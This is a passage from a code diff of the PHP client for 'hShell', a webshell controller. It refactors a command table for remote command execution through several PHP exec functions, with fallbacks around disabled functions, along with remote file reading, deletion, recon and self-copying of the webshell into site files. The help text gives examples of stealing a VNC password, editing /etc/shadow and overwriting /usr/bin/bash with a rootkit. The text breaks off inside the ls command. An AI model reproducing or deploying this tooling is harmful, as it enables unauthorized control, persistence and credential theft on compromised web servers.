@@ -5,6 +5,7 @@ class Client
     private $prompt;
     private $shell_url;
     private $current_dir;
+    private $functions;
 
     public function __construct($argv)
     {
@@ -13,11 +14,218 @@ class Client
         $this->shell_url   = false;
         $this->current_dir = false;
 
+        // Register functions
+        $this->functions   = array(
+            'help'       => array(
+                'args'        => '',
+                'example'     => '',
+                'description' => 'Show current help messages.',
+                'status'      => 'stable',
+                'function'    => 'cmd_help'
+            ),
+            'connect'    => array(
+                'args'        => '[url]',
+                'example'     => 'connect http://127.0.0.1/server.php',
+                'description' => 'Connect to Server WebShell script.',
+                'status'      => 'stable',
+                'function'    => 'cmd_connect'
+            ),
+            'cat'        => array(
+                'args'        => '[file path]',
+                'example'     => 'cat /etc/passwd',
+                'description' => 'Show the content of remote file.',
+                'status'      => 'stable',
+                'function'    => 'cmd_cat'
+            ),
+            'tail'       => array(
+                'args'        => '[file path]',
+                'example'     => 'tail /var/log/secure',
+                'description' => 'Read the last lines of specific file.',
+                'status'      => 'unimplemented',
+                'function'    => 'cmd_tail'
+            ),
+            'cd'         => array(
+                'args'        => '[directory]',
+                'example'     => 'cd /home/',
+                'description' => 'Navigate to specific remote directory.',
+                'status'      => 'stable',
+                'function'    => 'cmd_cd'
+            ),
+            'uname'      => array(
+                'args'        => '',
+                'example'     => '',
+                'description' => 'Show the full info of the System Operative of the server.',
+                'status'      => 'stable',
+                'function'    => 'cmd_uname'
+            ),
+            'exec'       => array(
+                'args'        => '[command]',
+                'example'     => 'exec reg query HKEY_LOCAL_MACHINE\\SOFTWARE\\RealVNC\\WinVNC4 /v password',
+                'description' => 'Execute a simple command in remote server using the current remote path. Detect automatic available method on the server. See the force-exec command.',
+                'status'      => 'stable',
+                'function'    => 'cmd_exec'
+            ),
+            'force-exec' => array(
+                'args'        => '[method] [command]',
+                'example'     => 'force-exec passthru reg query HKEY_LOCAL_MACHINE\\SOFTWARE\\RealVNC\\WinVNC4 /v password',
+                'description' => 'Force execute a simple command in remote server using an specific php method in current path. Available methods: system, exec, shell_exec, passthru, popen, proc_open, explicit (using double quotes ``).',
+                'status'      => 'stable',
+                'function'    => 'cmd_force_exec'
+            ),
+            'edit'       => array(
+                'args'        => '[editor command] [remote file path]',
+                'example'     => 'edit vi /etc/shadow',
+                'description' => 'Edit remote file with specific local command edtor',
+                'status'      => 'unimplemented',
+                'function'    => 'cmd_edit'
+            ),
+            'nano'       => array(
+                'args'        => '[remote file path]',
+                'example'     => 'nano /etc/shadow',
+                'description' => 'Edit remote file with nano editor on the local system.',
+                'status'      => 'unimplemented',
+                'function'    => 'cmd_nano'
+            ),
+            'vi'         => array(
+                'args'        => '[remote file path]',
+                'example'     => 'vi /etc/shadow',
+                'description' => 'Edit remote file with vi editor on the local system.',
+                'status'      => 'unimplemented',
+                'function'    => 'cmd_vi'
+            ),
+            'vim'        => array(
+                'args'        => '[remote file path]',
+                'example'     => 'vim /etc/shadow',
+                'description' => 'Edit remote file with vim editor on the local system.',
+                'status'      => 'unimplemented',
+                'function'    => 'cmd_vim'
+            ),
+            'gedit'      => array(
+                'args'        => '[remote file path]',
+                'example'     => 'gedit /etc/shadow',
+                'description' => 'Edit remote file with gedit editor on the local system.',
+                'status'      => 'unimplemented',
+                'function'    => 'cmd_gedit'
+            ),
+            'notepad'    => array(
+                'args'        => '[remote file path]',
+                'example'     => 'notepad /etc/shadow',
+                'description' => 'Edit remote file with notepad.exe editor on the local system (only on local windows systems).',
+                'status'      => 'unimplemented',
+                'function'    => 'cmd_notepad'
+            ),
+            'sublime'    => array(
+                'args'        => '[remote file path]',
+                'example'     => 'sublime /etc/shadow',
+                'description' => 'Edit remote file with sublime editor on the local system.',
+                'status'      => 'unimplemented',
+                'function'    => 'cmd_sublime'
+            ),
+            'mysql'      => array(
+                'args'        => '[host] [port] [user] [password]',
+                'example'     => 'mysql localhost 3306 root 123456',
+                'description' => 'Start an interative MySQL session',
+                'status'      => 'unimplemented',
+                'function'    => 'cmd_mysql'
+            ),
+            'mysqldump'  => array(
+                'args'        => '[host] [port] [user] [password] [local file]',
+                'example'     => 'mysql localhost 3306 root 123456 ./dump.sql',
+                'description' => 'Make a dump from remote database to local SQL file',
+                'status'      => 'unimplemented',
+                'function'    => 'cmd_mysqldump'
+            ),
+            'download'   => array(
+                'args'        => '[remote path] [local path]',
+                'example'     => 'download /home/site/public_html ./backup',
+                'description' => 'Download a backup of file or directory from server to local path. If path finish with "/" download the content of folder (like as rsync). Not need a ssh access.',
+                'status'      => 'unimplemented',
+                'function'    => 'cmd_download'
+            ),
+            'upload'     => array(
+                'args'        => '[local path] [remote path]',
+                'example'     => 'upload ./rootkit.bin /usr/bin/bash',
+                'description' => 'Upload a local file or directory to remote directory (maintains the same permits)',
+                'status'      => 'unimplemented',
+                'function'    => 'cmd_upload'
+            ),
+            'mkdir'      => array(
+                'args'        => '[remote path]',
+                'example'     => 'mkdir /tmp/backup/',
+                'description' => 'Make a directory on the server.',
+                'status'      => 'stable',
+                'function'    => 'cmd_mkdir'
+            ),
+            'rm'         => array(
+                'args'        => '[remote path]',
+                'example'     => 'rm /tmp/backup/',
+                'description' => 'Delete the specific file or directory path.',
+                'status'      => 'stable',
+                'function'    => 'cmd_rm'
+            ),
+            'phpinfo'    => array(
+                'args'        => '',
+                'example'     => '',
+                'description' => 'Show the full info of the php, libraries and enviroments of the server.',
+                'status'      => 'stable',
+                'function'    => 'cmd_phpinfo'
+            ),
+            'id'         => array(
+                'args'        => '',
+                'example'     => '',
+                'description' => 'Show the full info of the current user and group on the server.',
+                'status'      => 'stable',
+                'function'    => 'cmd_id'
+            ),
+            'ls'         => array(
+                'args'        => '',
+                'example'     => '',
+                'description' => 'List files and folders of the current path on the server. Alias of ll and dir commands.',
+                'status'      => 'stable',
+                'function'    => 'cmd_ls'
+            ),
+            'shellpath'  => array(
+                'args'        => '',
+                'example'     => '',
+                'description' => 'Show the current local path of the WebShell server.',
+                'status'      => 'stable',
+                'function'    => 'cmd_shellpath'
+            ),
+            'pwd'        => array(
+                'args'        => '',
+                'example'     => '',
+                'description' => 'Show the current local path on the server.',
+                'status'      => 'stable',
+                'function'    => 'cmd_pwd'
+            ),
+            'install'    => array(
+                'args'        => '[remote file path]',
+                'example'     => 'install /home/website/public_html/admin/config.php',
+                'description' => 'Install a copy of the WebShell on the specific remote parh, if the directory does not exist, it will create it recursively.',
+                'status'      => 'stable',
+                'function'    => 'cmd_install'
+            ),
+            'uninstall'  => array(
+                'args'        => '',
+                'example'     => '',
+                'description' => 'Uninstall the current WebShell on the server.',
+                'status'      => 'stable',
+                'function'    => 'cmd_uninstall'
+            ),
+            'exit'       => array(
+                'args'        => '',
+                'example'     => '',
+                'description' => 'Exit of the client but not remove the WebShell on the server. See uninstall. Alias of quit command.',
+                'status'      => 'stable',
+                'function'    => 'cmd_exit'
+            )
+        );
+
         // Check for CLI mode
         if(php_sapi_name() === 'cli') 
         {
             // Header for welcome
-            echo " ──────────── Welcome to hShell 💀 v0.6 Alpha ───────────────── \n";
+            echo " ──────────── Welcome to hShell 💀 v0.7 Alpha ───────────────── \n";
             echo "  Author             : WHK@elhacker.net                         \n";
             echo "  For bugs & updates : https://github.com/WHK102/hShell         \n";
             echo "  Thanks             : To my computer, coffee and the weekend   \n";
@@ -40,875 +248,851 @@ class Client
                     {
                         $parts = explode(' ', $line);
                         $command = array_shift($parts);
-                        $this->callExec($command, $parts, true);
+                        $this->callExec($command, $parts, 1);
                     }
                     else
                     {
-                        $this->callExec($line, null, true);
+                        $this->callExec($line, null, 1);
                     }
                 }
                 else
                 {
                     echo "+ Connect to url: ";
                     $url = trim(fgets(STDIN));
-                    $this->callExec('connect', array($url), true);
+                    $this->callExec('connect', array($url), 1);
                 }
             }
         }
         else
         {
-            echo "! Only for CLI mode.\n";
+            $this->out('! Only for CLI mode.');
         }
     }
 
-    private function callExec($command, $argv, $echo = true)
+    private function log($message, $debug_level = 1)
     {
-        if(in_array($command, array('connect')))
+        if($debug_level > 0)
         {
-            if($this->shell_url)
-            {
-                echo "! Disconnected for the current server.";
-            }
+            echo $message."\n";
+        }
+    }
 
-            // Try connect to remote server shell
-            $this->shell_url = (count($argv) > 0) ? trim(implode(' ', $argv)) : '';
-            if(filter_var($this->shell_url, FILTER_VALIDATE_URL))
+    private function cmd_help($argv, $debug_level = 1)
+    {
+        $message = '';
+        foreach($this->functions as $cmd => $properties)
+        {
+            $message .= implode("\n", array(
+                ' ──────────────────────────────────────────────────',
+                '  Command     : '.$cmd.' '.$properties['args'],
+                '  Status      : '.$properties['status'],
+                '  Description : '.$properties['description'],
+            ))."\n";
+        }
+        $message .= "\n";
+
+        $this->log($message, $debug_level);
+        return $message;
+    }
+
+    private function cmd_connect($argv, $debug_level = 1)
+    {
+        if($this->shell_url)
+        {
+            $this->log('! Disconnected for the current server.', $debug_level);
+        }
+
+        // Try connect to remote server shell
+        $this->shell_url = (count($argv) > 0) ? trim(implode(' ', $argv)) : '';
+        if(filter_var($this->shell_url, FILTER_VALIDATE_URL))
+        {
+            $this->log('+ Connecting ...', $debug_level);
+            $this->current_dir = $this->callExec('shellpath', null, 0);
+            if($this->current_dir)
             {
-                echo "+ Connecting ...\n";
-                $this->current_dir = $this->callExec('shellpath', null, false);
-                if($this->current_dir)
-                {
-                    echo "+ Connected!\n";
-                }
-                else
-                {
-                    echo "! Unable to connect, try again.\n";
-                    $this->current_dir = false;
-                    $this->shell_url   = false;
-                }
+                $this->log('+ Connected!', $debug_level);
+                return true;
             }
             else
             {
-                echo "! Invalid URL.\n";
+                $this->log('! Unable to connect, try again.', $debug_level);
                 $this->current_dir = false;
                 $this->shell_url   = false;
             }
         }
-        else if(in_array($command, array('help')))
+        else
         {
-            echo implode("\n", array(
-                "  NOTE: * is under construction.",
-                "  Command             | Description",
-                " ────────────────────────────────────────────────────────────── ",
-                "  connect [url]       : Connect to Server WebShell script.",
-                "  help                : Show help of the client.",
-                "  cat                 : Show the content of remote file.",
-                "* tail [file path]    : Read the last lines of specific file.",
-                "  cd [directory]      : Navigate to specific remote directory.",
-                "  shell [command]     : Execute a simple command in remote server using the",
-                "      current remote path. Detect automatic available method on the server.",
-                "      See the call-exec command. Alias of exec and system commands.",
-                "  force-shell [method] [command] : Force execute a simple command in remote",
-                "      server using an specific php method in current path. Alias of force-exec",
-                "      and force-system commands.",
-                "      Available methods: system, exec, shell_exec, passthru, popen, proc_open,",
-                "      explicit (using double quotes `).",
-                "* edit [editor command] [file path] : Edit remote file with specific local",
-                "      command edtor, example: edit vi /etc/shadow",
-                "* nano [file path]    : Edit remote file with nano editor on the local system.",
-                "* vi [file path]      : Edit remote file with vi editor on the local system.",
-                "* vim [file path]     : Edit remote file with vim editor on the local system.",
-                "* gedit [file path]   : Edit remote file with gedit editor on the local system.",
-                "* notepad [file path] : Edit remote file with notepad editor on the local",
-                "      system.",
-                "* sublime [file path] : Edit remote file with sublime text editor on the local",
-                "      system.",
-                "  uninstall           : Uninstall the current WebShell on the server.",
-                "  install [file path] : Install a copy of the WebShell on the specific remote",
-                "      parh, if the directory does not exist, it will create it recursively.",
-                "* mysql [host] [port] [user] [password] : Start an interative MySQL shell",
-                "      connection on the remote server.",
-                "* mysqldump [host] [port] [user] [password] [local file] : Make a dump from",
-                "      remote database to local file .sql",
-                "* download [remote path] [local path] : Download a backup of file or directory",
-                "      from server to local path.",
-                "* upload [local path] [remote path] : Upload a local file or directory to",
-                "      remote directory (maintains the same permits)",
-                "  rm [path]           : Delete the specific file or directory path.",
-                "  mkdir [path]        : Make a directory on the server.",
-                "  phpinfo             : Show the full info of the php, libraries and enviroments",
-                "      of the server.",
-                "  id                  : Show the full info of the current user and group on the",
-                "      server.",
-                "  ls                  : List files and folders of the current path on the",
-                "      server. Alias of ll and dir commands.",
-                "  shellpath           : Show the current local path of the WebShell server.",
-                "  pwd                 : Show the current local path on the server.",
-                "  uname               : Show the full info of the System Operative of the",
-                "      server.",
-                "  exit                : Exit of the client but not remove the WebShell on the",
-                "      server. See uninstall. Alias of quit command.",
-                ""
-            ));
+            $this->log('! Invalid URL.', $debug_level);
+            $this->current_dir = false;
+            $this->shell_url   = false;
         }
-        else if(in_array($command, array('edit')))
-        {
-            $filename = (count($argv) > 0) ? implode(' ', $argv) : '';
-            // TODO: Download, edit and upload
-            // TODO: Under construction.
-            echo "! Under construction.\n";
-        }
-        else if(in_array($command, array('nano')))
-        {
-            array_unshift($argv, 'nano'); // Add the specific editor
-            $this->callExec($command, $argv);
-        }
-        else if(in_array($command, array('vi')))
-        {
-            array_unshift($argv, 'vi'); // Add the specific editor
-            $this->callExec($command, $argv);
-        }
-        else if(in_array($command, array('vim')))
-        {
-            array_unshift($argv, 'vim'); // Add the specific editor
-            $this->callExec($command, $argv);
-        }
-        else if(in_array($command, array('gedit')))
-        {
-            array_unshift($argv, 'gedit'); // Add the specific editor
-            $this->callExec($command, $argv);
-        }
-        else if(in_array($command, array('notepad')))
-        {
-            array_unshift($argv, 'notepad'); // Add the specific editor
-            $this->callExec($command, $argv);
-        }
-        else if(in_array($command, array('sublime')))
-        {
-            // TODO: Under construction
-            // TODO: find on /opt o %programfiles%
-            // array_unshift($argv, '/opt/sublime/sublime');
-            array_unshift($argv, 'sublime'); // Add the specific editor
-            $this->callExec($command, $argv);
-        }
-        else if(in_array($command, array('uninstall')))
-        {
-           $result = $this->sendBuffer('
-                $filename = trim(preg_replace(\'/\\(.*$/\', "", __FILE__));
-                @unlink($filename);
-                $result = file_exists($filename) ? -1 : 1;
-            ');
 
-            if($echo)
+        return false;
+    }
+
+    private function cmd_cat($argv, $debug_level = 1)
+    {
+        $filename = (count($argv) > 0) ? implode(' ', $argv) : '';
+
+        $this->sendBuffer('
+            $path = "'.$this->escapePHP($filename).'";
+
+            if(file_exists($path) && is_file($path))
             {
-                if((int)$result === 1)
+                if(is_readable($path))
                 {
-                    echo "The WebShell server has been successfully removed!.\n";
-
-                    // Disconnect from server
-                    $this->callExec('exit', array(), true);
-                }
-                else if((int)$result === -1)
-                {
-                    echo "Unable to delete the file. Check your permissions and try again.\n";
-                }
-                else
-                {
-                    echo "Error 500: invalid status.\n";
-                }
-            }
-            return $result;
-        }
-        else if(in_array($command, array('install')))
-        {
-            $filepath = (count($argv) > 0) ? implode(' ', $argv) : '';
-            
-            $result = $this->sendBuffer('
-                $filepath  = "'.$this->escapePHP($filepath).'";
-
-                function inst($filepath)
-                {
-                    // for __file__ from eval (php bug)
-                    @file_put_contents($filepath, file_get_contents(trim(preg_replace(\'/\\(.*$/\', "", __FILE__))));
-                    return file_exists($filepath);
-                }
-
-                function checkdir($directory)
-                {
-                    if(is_dir($directory))
+                    $handler = fopen($path, "r");
+                    if($handler)
                     {
-                        return true;
-                    }
-                    else
-                    {
-                        @mkdir($directory, 0700, true);
-
-                        if(is_dir($directory))
-                        {
-                            return true;
-                        }
-                        else
-                        {
-                            return false;
-                        }
-                    }
-                }
-
-                if((strpos($filepath, "/") !== false) || (strpos($filepath, "\\\\") !== false))
-                {
-                    $directory = dirname($filepath);
-
-                    if(checkdir($directory))
-                    {
-                        $result = inst($filepath) ? 1 : -1;
-                    }
-                    else
-                    {
-                        $result = -2;
-                    }
-                }
-                else
-                {
-                    $result = inst($filepath) ? 1 : -1;
-                }
-            ');
-
-            if($echo)
-            {
-                if((int)$result === 1)
-                {
-                    echo "Installed a copy of server into path!.\n";
-                }
-                else if((int)$result === -1)
-                {
-                    echo "Unable write on specific directory. Check your permissions and try again.\n";
-                }
-                else if((int)$result === -2)
-                {
-                    echo "The directory of the copy does not exists and canot make this. Check your permissions and try again.\n";
-                }
-                else
-                {
-                    echo "Error 500: invalid status.\n";
-                }
-            }
-            return $result;
-        }
-        else if(in_array($command, array('force-shell', 'force-exec', 'force-system')))
-        {
-            // TODO: add: pcntl_exec
-            if(count($argv) > 1)
-            {
-                $method  = array_shift($argv);
-                $command = implode(' ', $argv);
-
-                if($method === 'system')
-                {
-                    $this->sendBuffer('
-                        system("'.$this->escapePHP($command).'");
-                    ', 'self::callbackCommandGenericFlush', true);
-                    echo "\n";
-                }
-                else if($method === 'exec')
-                {
-                    $this->sendBuffer('
-                        exec("'.$this->escapePHP($command).'", $lines);
-                        echo implode("\n", $lines)."\n";
-                    ', 'self::callbackCommandGenericFlush', true);
-                    echo "\n";
-                }
-                else if($method === 'shell_exec')
-                {
-                    $this->sendBuffer('
-                        echo shell_exec("'.$this->escapePHP($command).'");
-                    ', 'self::callbackCommandGenericFlush', true);
-                    echo "\n";
-                }
-                else if($method === 'passthru')
-                {
-                    $this->sendBuffer('
-                        echo passthru("'.$this->escapePHP($command).'");
-                    ', 'self::callbackCommandGenericFlush', true);
-                    echo "\n";
-                }
-                else if($method === 'popen')
-                {
-                    $this->sendBuffer('
-                        $handler = popen("'.$this->escapePHP($command).'", "r");
                         while(!feof($handler))
                         {
-                            echo fread($handler, 1024);
+                            echo fgets($handler, 1024);
                         }
-                        @pclose($handler);
-                    ', 'self::callbackCommandGenericFlush', true);
-                    echo "\n";
-                }
-                else if($method === 'proc_open')
-                {
-                    $this->sendBuffer('
-                        $process = proc_open("'.$this->escapePHP($command).'", array(
-                           0 => array("pipe", "r"),
-                           1 => array("pipe", "w")
-                        ), $pipes, $current_dir, array());
-
-                        if (is_resource($process))
-                        {
-                            fclose($pipes[0]);
-                            echo stream_get_contents($pipes[1]);
-                            fclose($pipes[1]);
-                            proc_close($process);
-                        }
-                    ', 'self::callbackCommandGenericFlush', true);
-                    echo "\n";
-                }
-                else if($method === 'explicit')
-                {
-                    $this->sendBuffer('
-                        $command = "'.$this->escapePHP($command).'";
-                        echo `$command`;
-                    ', 'self::callbackCommandGenericFlush', true);
-                    echo "\n";
+                        fclose($handler);
+                    }
                 }
                 else
                 {
-                    echo "! Unknown method. See help command.";
+                    echo "! You do not have permission to read the file.";
                 }
             }
             else
             {
-                echo "! Need more arguments";
+                echo "! The file does not exists.";
             }
-        }
-        else if(in_array($command, array('shell', 'exec', 'system')))
+        ', 'self::callbackCommandGenericFlush', true);
+        echo "\n";
+    }
+
+    public function cmd_tail($argv, $debug_level = 1)
+    {
+        // ...
+    }
+
+    public function cmd_cd($argv, $debug_level = 1)
+    {
+        // Default browse "/"
+        $dir = (count($argv) > 0) ? implode(' ', $argv) : '/';
+
+        $result = $this->sendBuffer('
+            $directory = "'.$this->escapePHP($dir).'";
+            if(is_dir($directory) && is_readable($directory))
+            {
+                @chdir($directory);
+            }
+
+            $result = getcwd();
+        ');
+
+        if($this->current_dir == $result)
         {
-            // TODO: add: pcntl_exec
+            $this->log('The directory does not exist or is inaccessible.', $debug_level);
+            return false;
+        }
+        else
+        {
+            $this->current_dir = $result;
+            return $this->current_dir;
+        }
+    }
 
-            $command = (count($argv) > 0) ? implode(' ', $argv) : '';
+    private function cmd_uname($argv, $debug_level = 1)
+    {
+        // Execution
+        $result = $this->sendBuffer('
+            $result = php_uname();
+        ');
 
-            $this->sendBuffer('
-                $command     = "'.$this->escapePHP($command).'";
-                $current_dir = "'.$this->escapePHP($this->current_dir).'";
-                $disabled    = @ini_get("disable_functions");
+        $this->log($result, $debug_level);
+        return $result;
+    }
 
-                if($disabled)
+    private function cmd_exec($argv, $debug_level = 1)
+    {
+        // TODO: add: pcntl_exec
+
+        $command = (count($argv) > 0) ? implode(' ', $argv) : '';
+
+        $this->sendBuffer('
+            $command     = "'.$this->escapePHP($command).'";
+            $current_dir = "'.$this->escapePHP($this->current_dir).'";
+            $disabled    = @ini_get("disable_functions");
+
+            if($disabled)
+            {
+                // Get disabled functions
+                $disabled = explode(",", $disabled);
+                $disabled = array_map(trim, $disabled);
+                $disabled = array_map(strtolower, $disabled);
+
+                // Possible methods to use
+                $enabled = array("system", "exec", "shell_exec", "passthru", "popen", "proc_open");
+
+                // Determines what method can be used.
+                if(!in_array("system", $disabled))
                 {
-                    // Get disabled functions
-                    $disabled = explode(",", $disabled);
-                    $disabled = array_map(trim, $disabled);
-                    $disabled = array_map(strtolower, $disabled);
+                    system($command);
+                }
+                else if(!in_array("exec", $disabled))
+                {
+                    exec($command, $lines);
+                    echo implode("\n", $lines)."\n";
+                }
+                else if(!in_array("shell_exec", $disabled))
+                {
+                    echo shell_exec($command);
+                }
+                else if(!in_array("passthru", $disabled))
+                {
+                    echo passthru($command);
+                }
+                else if(!in_array("popen", $disabled))
+                {
+                    $handler = popen($command, "r");
+                    while(!feof($handler))
+                    {
+                        echo fread($handler, 1024);
+                    }
+                    @pclose($handler); // Dissabled?
+                }
+                else if(!in_array("proc_open", $disabled))
+                {
+                    $process = proc_open($command, array(
+                       0 => array("pipe", "r"),
+                       1 => array("pipe", "w")
+                    ), $pipes, $current_dir, array());
 
-                    // Possible methods to use
-                    $enabled = array("system", "exec", "shell_exec", "passthru", "popen", "proc_open");
-
-                    // Determines what method can be used.
-                    if(!in_array("system", $disabled))
+                    if (is_resource($process))
                     {
-                        system($command);
-                    }
-                    else if(!in_array("exec", $disabled))
-                    {
-                        exec($command, $lines);
-                        echo implode("\n", $lines)."\n";
-                    }
-                    else if(!in_array("shell_exec", $disabled))
-                    {
-                        echo shell_exec($command);
-                    }
-                    else if(!in_array("passthru", $disabled))
-                    {
-                        echo passthru($command);
-                    }
-                    else if(!in_array("popen", $disabled))
-                    {
-                        $handler = popen($command, "r");
-                        while(!feof($handler))
-                        {
-                            echo fread($handler, 1024);
-                        }
-                        @pclose($handler); // Dissabled?
-                    }
-                    else if(!in_array("proc_open", $disabled))
-                    {
-                        $process = proc_open($command, array(
-                           0 => array("pipe", "r"),
-                           1 => array("pipe", "w")
-                        ), $pipes, $current_dir, array());
-
-                        if (is_resource($process))
-                        {
-                            fclose($pipes[0]);
-                            echo stream_get_contents($pipes[1]);
-                            fclose($pipes[1]);
-                            proc_close($process);
-                        }
-                    }
-                    else
-                    {
-                        echo `$command`;
+                        fclose($pipes[0]);
+                        echo stream_get_contents($pipes[1]);
+                        fclose($pipes[1]);
+                        proc_close($process);
                     }
                 }
                 else
                 {
                     echo `$command`;
                 }
-                
-            ', 'self::callbackCommandGenericFlush', true);
-            echo "\n";
-        }
-        else if(in_array($command, array('mysql')))
-        {
-            // TODO: Add support to mysql, postgre, oracle, mssql, h2, mongo and use as argument: database [driver] [connection schema]
-            // TODO: Under construction.
-            echo "! Under construction.\n";
-        }
-        else if(in_array($command, array('mysqldump')))
-        {
-            // TODO: Under construction.
-            echo "! Under construction.\n";
-        }
-        else if(in_array($command, array('download')))
-        {
-            // TODO: Under construction.
-            echo "! Under construction.\n";
-        }
-        else if(in_array($command, array('upload')))
-        {
-            // TODO: Under construction.
-            echo "! Under construction.\n";
-        }
-        else if(in_array($command, array('cat')))
-        {
-            $filename = (count($argv) > 0) ? implode(' ', $argv) : '';
-
-            $this->sendBuffer('
-                $path = "'.$this->escapePHP($filename).'";
-
-                if(file_exists($path) && is_file($path))
-                {
-                    if(is_readable($path))
-                    {
-                        $handler = fopen($path, "r");
-                        if($handler)
-                        {
-                            while(!feof($handler))
-                            {
-                                echo fgets($handler, 1024);
-                            }
-                            fclose($handler);
-                        }
-                    }
-                    else
-                    {
-                        echo "! You do not have permission to read the file.";
-                    }
-                }
-                else
-                {
-                    echo "! The file does not exists.";
-                }
-            ', 'self::callbackCommandGenericFlush', true);
-            echo "\n";
-        }
-        else if(in_array($command, array('tail')))
-        {
-            $filename = (count($argv) > 0) ? implode(' ', $argv) : '';
-            // TODO: Under construction.
-        }
-        else if(in_array($command, array('rm')))
-        {
-            $path = (count($argv) > 0) ? implode(' ', $argv) : '';
-
-            $result = $this->sendBuffer('
-                $path = "'.$this->escapePHP($path).'";
-
-                function del_tree($dir)
-                {
-                    $files = array_diff(scandir($dir), array(".", ".."));
-                    foreach ($files as $file)
-                    {
-                        if(is_dir("$dir/$file"))
-                        {
-                            del_tree("$dir/$file");
-                        }
-                        else
-                        {
-                            @unlink("$dir/$file");
-                        }
-                    }
-                    return @rmdir($dir);
-                } 
-
-                if(is_dir($path))
-                {
-                    if(del_tree($path))
-                    {
-                        $result = 1;
-                    }
-                    else
-                    {
-                        $result = 0;
-                    }
-                }
-                else if(is_file($path))
-                {
-                    if(unlink($path))
-                    {
-                        $result = 1;
-                    }
-                    else
-                    {
-                        $result = 0;
-                    }
-                }
-                else
-                {
-                    $result = -1;
-                }
-            ');
-
-            if($echo)
-            {
-                if((int)$result === 0)
-                {
-                    echo "Unable to delete the file or directory. Verify that you have permissions.\n";
-                }
-                else if((int)$result === -1)
-                {
-                    echo "The file or directory does not exist.\n";
-                }
-                else if((int)$result === 1)
-                {
-                    echo "Deleted!.\n";
-                }
-                else
-                {
-                    echo "Error 500: invalid status.\n";
-                }
-            }
-            return $result;
-        }
-        else if(in_array($command, array('mkdir')))
-        {
-            $dirname = (count($argv) > 0) ? implode(' ', $argv) : '';
-
-            $result = $this->sendBuffer('
-                $result = 0;
-                if(@mkdir("'.$this->escapePHP($dirname).'", 0777, true))
-                {
-                    $result = 1;
-                }
-            ');
-
-            if($echo && ((int)$result === 0))
-            {
-                echo "Unable to create the directory on this route.\n";
-            }
-            return $result;
-        }
-        elseif(in_array($command, array('phpinfo')))
-        {
-
-            $result = $this->sendBuffer('
-                ob_start();
-                phpinfo(-1);
-
-                $pi = preg_replace(
-                    array(
-                        "#PHP Credits(.*)#ms",
-                        "#^.*<body>(.*)</body>.*$#ms", "#<h2>PHP License</h2>.*$#ms",
-                        "#<h1>Configuration</h1>#", "#\r?\n#", "#</(h1|h2|h3|tr)>#",
-                        "# +<#", "#[ \t]+#", "#&nbsp;#", "#  +#", "# class=\\".*?\\"#", "%&#039;%", 
-                        "#<tr>(?:.*?)\\" src=\\"(?:.*?)=(.*?)\\" alt=\\"PHP Logo\\" /></a><h1>PHP Version (.*?)</h1>(?:\n+?)</td></tr>#",
-                        "#<tr>(?:.*?)\\" src=\\"(?:.*?)=(.*?)\\"(?:.*?)Zend Engine (.*?),(?:.*?)</tr>#",
-                        "# +#", "#<tr>#", "#</tr>#"
-                    ),
-                    array(
-                        "", "\\$1", "", "", "", "</\\$1>\n", "<", " ", " ", " ", "", " ",
-                        "<h2>PHP Configuration</h2>\n"."<tr><td>PHP Version</td><td>\\$2</td></tr>".
-                        "\n<tr><td>PHP Egg</td><td>\\$1</td></tr>",
-                        "<tr><td>Zend Engine</td><td>\\$2</td></tr>\n".
-                        "<tr><td>Zend Egg</td><td>\\$1</td></tr>", " ", "%S%", "%E%"
-                    ),
-                    ob_get_clean()
-                );
-
-                $sections = explode("<h2>", strip_tags($pi, "<h2><th><td>"));
-                unset($sections[0]);
-
-                $pi = array();
-                foreach($sections as $section){
-                    $n = substr($section, 0, strpos($section, "</h2>"));
-                    preg_match_all("#%S%(?:<td>(.*?)</td>)?(?:<td>(.*?)</td>)?(?:<td>(.*?)</td>)?%E%#", $section, $askapache, PREG_SET_ORDER);
-                    foreach($askapache as $m)
-                        $pi[$n][$m[1]]= (!isset($m[3]) || $m[2] == $m[3]) ? $m[2] : array_slice($m, 2);
-                }
-                
-                $result = $pi;
-            ');
-
-            if($echo)
-            {
-                foreach($result as $title => $items)
-                {
-                    echo 
-                        "+".str_repeat("-", 78)."+\n".
-                        "| ".str_pad(" ".strtoupper($title)." ", 76, ' ', STR_PAD_BOTH)." |\n".
-                        "+".str_repeat("-", 78)."+\n";
-
-                    foreach($items as $var => $val)
-                    {
-                        if(is_array($val))
-                            $val = implode(", ", $val);
-                        $var = htmlspecialchars_decode($var, ENT_QUOTES);
-                        $val = htmlspecialchars_decode($val, ENT_QUOTES);
-
-                        echo '| '.str_pad($var, 36, ' ', STR_PAD_RIGHT).' | '.str_pad($val, 37, ' ', STR_PAD_RIGHT)." |\n";
-                    }
-                    echo "+".str_repeat("-", 78)."+\n\n";
-                }
-            }
-
-            return $result;
-        }
-        else if(in_array($command, array('cd')))
-        {
-            // Default browse "/"
-            $dir = (count($argv) > 0) ? implode(' ', $argv) : '/';
-
-            $result = $this->sendBuffer('
-                if(
-                    is_dir("'.$this->escapePHP($dir).'") &&
-                    is_readable("'.$this->escapePHP($dir).'")
-                )
-                {
-                    @chdir("'.$this->escapePHP($dir).'");
-                }
-
-                $result = getcwd();
-            ');
-
-            if($this->current_dir == $result)
-            {
-                echo "The directory does not exist or is inaccessible..\n";
             }
             else
             {
-                $this->current_dir = $result;
+                echo `$command`;
             }
+            
+        ', 'self::callbackCommandGenericFlush', true);
+        echo "\n";
+    }
 
-            return $result;
-        }
-        else if(in_array($command, array('id')))
+    private function cmd_force_exec($argv, $debug_level = 1)
+    {
+        // TODO: add: pcntl_exec
+        if(count($argv) > 1)
         {
-            $result = $this->sendBuffer('
-                $uid       = getmyuid();
-                $gid       = getmygid();
-                $username  = get_current_user();
-                $groupname = "";
+            $method  = array_shift($argv);
+            $command = implode(' ', $argv);
 
-                if(function_exists("posix_getgrgid"))
-                {
-                    if($groupname = @posix_getgrgid($gid))
-                    {
-                        $groupname = $groupname["name"];
-                    }
-                }
-
-                $result = "uid=".$uid."(".$username.") gid=".$gid."(".$groupname.")";
-            ');
-
-            if($echo)
+            if($method === 'system')
             {
-                echo $result."\n";
+                $this->sendBuffer('
+                    system("'.$this->escapePHP($command).'");
+                ', 'self::callbackCommandGenericFlush', true);
+                $this->log('', $debug_level); // Newline
+                return true;
             }
-
-            return $result;
-        }
-        else if(in_array($command, array('ls', 'll', 'dir')))
-        {
-            $result = $this->sendBuffer('
-                clearstatcache();
-
-                $files        = array();
-                $dirs         = array();
-                $dir_handler  = opendir("./");
-
-                while (false !== ($filename = readdir($dir_handler)))
-                {
-                    $info = @stat($filename);
-                    
-                    $user_name  = "-";
-                    $group_name = "-";
-                    
-                    if($info)
-                    {
-                        if(function_exists("posix_getpwuid"))
-                        {
